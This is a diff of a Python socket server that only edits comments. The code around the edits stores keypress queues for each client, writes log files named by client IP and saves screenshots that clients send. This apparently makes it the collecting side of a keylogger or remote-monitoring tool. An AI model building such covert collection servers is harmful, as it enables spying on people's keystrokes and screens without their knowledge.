@@ -12,7 +12,7 @@ SEPARATOR = "<sep>"
 clients = []
 client_sockets = {}
 keypress_queues = {}
-message_queues = {}  # Add this line
+message_queues = {} 
 
 
 # Function to handle client messages, including image data
@@ -20,7 +20,7 @@ def handle_client(client_socket, client_address):
     client_ip = client_address[0]
     print(f"Connection from {client_ip} established!")
 
-    message_queues[client_address] = queue.Queue()  # Add this line
+    message_queues[client_address] = queue.Queue()
 
     # client_address = client_socket.getpeername()[0]
     file_name = f"{client_ip}.txt"
@@ -35,9 +35,9 @@ def handle_client(client_socket, client_address):
 
                 if data == "image":
                     # Prepare to receive an image
-                    client_socket.send("Ready for image".encode())  # Send acknowledgment
+                    client_socket.send("Ready for image".encode())  # Send acknowledgment  TEST IF NEEDED
                     image_size = int(client_socket.recv(1024).decode())  # Get the image size
-                    client_socket.send("Size received".encode())  # Acknowledge size
+                    client_socket.send("Size received".encode())  # Acknowledge size    TEST IF NEEDED
 
                     # Receive the image in chunks
                     image_data = b""
@@ -48,7 +48,7 @@ def handle_client(client_socket, client_address):
                         image_data += packet
 
                     # Save the image to a file
-                    image_filename = f"{client_ip}_screenshot.jpg"
+                    image_filename = f"{client_ip}_screenshot.jpg" #can add {time.time()}
                     with open(image_filename, "wb") as image_file:
                         image_file.write(image_data)
 
